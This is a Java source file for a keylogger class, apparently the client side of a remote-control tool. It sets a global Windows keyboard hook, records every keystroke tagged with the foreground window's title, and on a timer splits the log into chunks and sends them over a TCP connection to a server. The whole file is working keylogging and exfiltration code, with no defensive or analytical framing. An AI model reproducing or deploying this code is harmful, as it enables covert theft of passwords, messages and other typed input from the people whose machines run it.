package Client;

import Server.IntervalThread;
import SocketMessageReceiver.DataType.KeyLogRequest;
import SocketMessageSender.CustomUserSender.KeyLogSender;
import Utilities.Utilities;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.User32;
import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyEvent;
import lc.kra.system.keyboard.event.GlobalKeyListener;

import java.awt.event.KeyEvent;
import java.lang.annotation.Native;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;

public class KeyLogger {
    private static final int LIMIT_LOG_SIZE = 1024; //Chars
    public static KeyLogger instance;

    public long interval;
    public boolean isRunning;

    private HashMap<Pointer, StringBuilder> log = new HashMap<>();

    private GlobalKeyListener listener;
    private GlobalKeyboardHook keyboardHook;

    private IntervalThread intervalThread;


    public KeyLogger(long interval) {
        this.interval = interval;

        this.intervalThread = new IntervalThread(interval);
        this.intervalThread.addAction(this::Log);

        this.keyboardHook = new GlobalKeyboardHook(false);
        this.listener = new GlobalKeyListener() {
            @Override
            public void keyPressed(GlobalKeyEvent globalKeyEvent) {
                var keyCode = globalKeyEvent.getVirtualKeyCode();
                var keyChar = keyCode == GlobalKeyEvent.VK_RETURN ? '\n' : "[" + KeyEvent.getKeyText(keyCode) + "]";

                char[] buffer = new char[1024];
                var user32 = User32.INSTANCE;
                var foregroundWindow = user32.GetForegroundWindow();

                user32.GetWindowText(foregroundWindow, buffer, buffer.length);

                var pointer = foregroundWindow.getPointer();
                if (!log.containsKey(pointer)) {
                    log.put(pointer, new StringBuilder());
                    log.get(pointer).append("Window: ").append(String.valueOf(buffer).trim()).append("\n");
                }

                log.get(pointer).append(keyChar);
            }

            @Override
            public void keyReleased(GlobalKeyEvent globalKeyEvent) {

            }
        };
    }

    public void start() {
        isRunning = true;

        intervalThread.start();
        keyboardHook.addKeyListener(listener);
    }

    public void stop() {
        isRunning = false;

        intervalThread.stop();
        keyboardHook.removeKeyListener(listener);
    }

    private void Log() {
        var bigLog = new StringBuilder();

        for (var entry : log.entrySet()) {
            bigLog.append(entry.getValue()).append("\n").append("==================================================").append("\n");
        }

        var logSize = bigLog.length();
        var splitSize = Math.round((logSize * 1.0f / LIMIT_LOG_SIZE) + .5f);


        var sender = new KeyLogSender(ClientInstance.tcpClient);
        var uuid = Utilities.getUUID();

        var date = new Date();
        var format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        var dateStr = format.format(date);

        for (var i = 0; i < splitSize; i++) {
            var start = i * LIMIT_LOG_SIZE;
            var end = Math.min(start + LIMIT_LOG_SIZE, logSize);

            var log = bigLog.substring(start, end);

            System.out.println(log);
            sender.send(null, new KeyLogRequest(uuid, log, dateStr));
        }

        log.clear();
    }
}
